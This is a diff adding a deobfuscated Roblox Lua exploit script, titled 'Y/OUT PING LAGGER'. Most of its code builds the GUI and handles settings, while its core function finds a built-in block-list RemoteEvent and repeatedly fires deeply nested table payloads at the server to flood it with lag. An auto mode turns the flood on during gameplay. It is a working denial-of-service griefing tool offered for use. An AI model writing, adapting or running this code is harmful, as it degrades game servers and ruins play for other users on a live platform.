@@ -1,0 +1,351 @@
+-- deobf by prince https://discord.gg/TBBAUZu8cW
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+local CONFIG_FILE = "KillHub_Config.json"
+
+local DEFAULT_CONFIG = {
+    power = 100000,
+    interval = 0.125,
+    keybindKb = "M",
+    keybindGp = "ButtonR2",
+    autoBrainrot = true,
+}
+
+local currentConfig = {
+    power = DEFAULT_CONFIG.power,
+    interval = DEFAULT_CONFIG.interval,
+    keybindKb = DEFAULT_CONFIG.keybindKb,
+    keybindGp = DEFAULT_CONFIG.keybindGp,
+    autoBrainrot = DEFAULT_CONFIG.autoBrainrot,
+}
+
+local currentKeybind = Enum.KeyCode.M
+local isListeningForInput = false
+
+local function saveConfig()
+    local data = {
+        power = currentConfig.power,
+        interval = currentConfig.interval,
+        keybindKb = currentConfig.keybindKb,
+        keybindGp = currentConfig.keybindGp,
+        autoBrainrot = currentConfig.autoBrainrot,
+        keybind = currentKeybind.Name
+    }
+    local success, encoded = pcall(function() return HttpService:JSONEncode(data) end)
+    if success and encoded and writefile then
+        pcall(writefile, CONFIG_FILE, encoded)
+    end
+end
+
+local function loadConfig()
+    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+    local success, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not success or type(data) ~= "table" then return end
+    
+    currentConfig.power = tonumber(data.power) or DEFAULT_CONFIG.power
+    currentConfig.interval = tonumber(data.interval) or DEFAULT_CONFIG.interval
+    currentConfig.keybindKb = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CONFIG.keybindKb
+    currentConfig.keybindGp = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CONFIG.keybindGp
+    currentConfig.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CONFIG.autoBrainrot
+    
+    if data.keybind then
+        currentKeybind = Enum.KeyCode[data.keybind] or Enum.KeyCode.M
+        currentConfig.keybindKb = data.keybind
+    end
+end
+
+loadConfig()
+
+local isActive = false
+local targetRemote = nil
+local isBrainrotMode = false
+local lastBrainrotState = false
+local manualOverride = false
+local pingLoopRunning = false
+
+for _, child in pairs(playerGui:GetChildren()) do
+    if child.Name == "KillHubGui" then
+        child:Destroy()
+    end
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KillHubGui"
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 15
+screenGui.Parent = playerGui
+
+local function animate(obj, properties, duration)
+    TweenService:Create(obj, TweenInfo.new(duration or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), properties):Play()
+end
+
+local function makeDraggable(frame)
+    local dragging, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    frame.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+local function isGamepadKeyCode(keyCode)
+    if not keyCode then return false end
+    local name = keyCode.Name
+    return name:find("Button") == 1 or name:find("DPad") or name:find("Thumbstick")
+end
+
+local BLACKLISTED = {
+    [Enum.KeyCode.Escape] = true,
+    [Enum.KeyCode.LeftControl] = true,
+    [Enum.KeyCode.Unknown] = true,
+}
+
+local MAIN_WIDTH, MAIN_HEIGHT = 220, 89
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, MAIN_WIDTH, 0, MAIN_HEIGHT)
+mainFrame.Position = UDim2.new(0.5, -MAIN_WIDTH/2, 0.5, -MAIN_HEIGHT/2)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Parent = screenGui
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color = Color3.fromRGB(40, 40, 40)
+mainStroke.Thickness = 1.5
+makeDraggable(mainFrame)
+
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 32)
+header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+header.BorderSizePixel = 0
+Instance.new("UICorner", header).CornerRadius = UDim.new(0, 10)
+
+local titleLbl = Instance.new("TextLabel", header)
+titleLbl.Size = UDim2.new(0, 155, 1, 0)
+titleLbl.Position = UDim2.new(0, 6, 0, 0)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text = "Y/OUT PING LAGGER"
+titleLbl.TextColor3 = Color3.new(1, 1, 1)
+titleLbl.Font = Enum.Font.GothamBlack
+titleLbl.TextSize = 13
+titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+local gearContainer = Instance.new("Frame", header)
+gearContainer.Size = UDim2.new(0, 16, 0, 16)
+gearContainer.Position = UDim2.new(1, -22, 0.5, -8)
+gearContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+gearContainer.BorderSizePixel = 0
+Instance.new("UICorner", gearContainer).CornerRadius = UDim.new(0, 4)
+local settingsBtn = Instance.new("ImageButton", gearContainer)
+settingsBtn.Size = UDim2.new(1, -2, 1, -2)
+settingsBtn.Position = UDim2.new(0, 1, 0, 1)
+settingsBtn.BackgroundTransparency = 1
+settingsBtn.Image = "rbxassetid://4995725616"
+settingsBtn.ImageColor3 = Color3.fromRGB(180, 180, 180)
+settingsBtn.AutoButtonColor = false
+
+local pingFrame = Instance.new("Frame", mainFrame)
+pingFrame.Size = UDim2.new(0, 205, 0, 38)
+pingFrame.Position = UDim2.new(0, 7, 0, 35)
+pingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+pingFrame.BorderSizePixel = 0
+Instance.new("UICorner", pingFrame).CornerRadius = UDim.new(0, 4)
+
+local toggleBtn = Instance.new("TextButton", pingFrame)
+toggleBtn.Size = UDim2.new(0, 205, 0, 38)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+toggleBtn.AutoButtonColor = false
+toggleBtn.Text = "APAGADO"
+toggleBtn.TextColor3 = Color3.fromRGB(255, 150, 150)
+toggleBtn.Font = Enum.Font.GothamBlack
+toggleBtn.TextSize = 14
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 4)
+
+local flipLag -- Forward declaration
+local function updateToggleButton()
+    if isActive then
+        toggleBtn.Text = "ACTIVO"
+        toggleBtn.TextColor3 = Color3.fromRGB(150, 255, 150)
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    else
+        toggleBtn.Text = "APAGADO"
+        toggleBtn.TextColor3 = Color3.fromRGB(255, 150, 150)
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    end
+end
+
+toggleBtn.MouseButton1Click:Connect(function()
+    flipLag(not isActive, true)
+end)
+
+local SET_WIDTH, SET_HEIGHT = 220, 210
+local settingsFrame = Instance.new("Frame")
+settingsFrame.Name = "SettingsPanel"
+settingsFrame.Size = UDim2.new(0, SET_WIDTH, 0, SET_HEIGHT)
+settingsFrame.Position = UDim2.new(0.5, -SET_WIDTH/2, 0.5, 60)
+settingsFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+settingsFrame.Visible = false
+settingsFrame.Parent = screenGui
+Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 12)
+makeDraggable(settingsFrame)
+
+local autoBrainrotBtn, keybindRow, powerBox, delayBox
+
+local function createInputRow(yPos, labelText, getValue, onConfirm)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size = UDim2.new(1, -16, 0, 30)
+    row.Position = UDim2.new(0, 8, 0, yPos)
+    row.BackgroundColor3 = Color3.new(0, 0, 0)
+    row.BackgroundTransparency = 0.6
+    row.BorderSizePixel = 0
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)
+    
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size = UDim2.new(0.5, 0, 1, 0)
+    lbl.Position = UDim2.new(0, 8, 0, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = labelText
+    lbl.TextColor3 = Color3.new(1, 1, 1)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 10
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    
+    local box = Instance.new("TextBox", row)
+    box.Size = UDim2.new(0, 65, 0, 22)
+    box.Position = UDim2.new(1, -73, 0.5, -11)
+    box.Text = tostring(getValue())
+    box.TextColor3 = Color3.new(1, 1, 1)
+    box.BackgroundTransparency = 0.6
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 10
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
+    
+    box.FocusLost:Connect(function()
+        local n = tonumber(box.Text)
+        if n then
+            onConfirm(n)
+            box.Text = tostring(getValue())
+            saveConfig()
+        else
+            box.Text = tostring(getValue())
+        end
+    end)
+    return box
+end
+
+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then return r end
+    end
+    for _, c in ipairs(rrs:GetChildren()) do
+        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
+    end
+    return nil
+end
+
+targetRemote = findRemote()
+
+local function buildPayload(power)
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, 186 do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(power / 188), 1000)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local function runPingLoop()
+    if not isActive or not targetRemote then pingLoopRunning = false return end
+    pingLoopRunning = true
+    local delay = currentConfig.interval
+    while isActive and targetRemote and pingLoopRunning do
+        local payload = buildPayload(currentConfig.power)
+        local success = pcall(function() targetRemote:FireServer(payload) end)
+        if not success then delay = math.min(delay * 1.5, 0.5) else delay = math.max(delay * 0.995, 0.05) end
+        task.wait(delay)
+    end
+    pingLoopRunning = false
+end
+
+function flipLag(state, isManual)
+    if not state and pingLoopRunning then pingLoopRunning = false end
+    isActive = state
+    if isManual then
+        if isBrainrotMode then manualOverride = not state else manualOverride = false end
+    end
+    if isActive then
+        if not targetRemote then targetRemote = findRemote() if not targetRemote then isActive = false end end
+        updateToggleButton()
+        if isActive then task.spawn(runPingLoop) end
+    else
+        updateToggleButton()
+    end
+end
+
+RunService.Heartbeat:Connect(function()
+    if not currentConfig.autoBrainrot then
+        if isBrainrotMode then isBrainrotMode = false lastBrainrotState = false if isActive then flipLag(false, false) end end
+        return
+    end
+    local char = localPlayer.Character
+    local hum = char and char:FindFirstChild("Humanoid")
+    if not hum then return end
+    local currentSpeed = hum.WalkSpeed
+    if currentSpeed < 25 then
+        if not lastBrainrotState then isBrainrotMode = true lastBrainrotState = true manualOverride = false if not isActive then flipLag(true, false) end end
+    else
+        if lastBrainrotState then isBrainrotMode = false lastBrainrotState = false manualOverride = false if isActive then flipLag(false, false) end end
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    local kc = input.KeyCode
+    if isListeningForInput then
+        if (input.UserInputType == Enum.UserInputType.Keyboard or isGamepadKeyCode(kc)) and not BLACKLISTED[kc] then
+            currentKeybind = kc
+            currentConfig.keybindKb = kc.Name
+            isListeningForInput = false
+            saveConfig()
+        end
+        return
+    end
+    if kc == Enum.KeyCode.LeftControl then
+        mainFrame.Visible = not mainFrame.Visible
+        return
+    end
+    if kc == currentKeybind then flipLag(not isActive, true) end
+end)
+
+updateToggleButton()
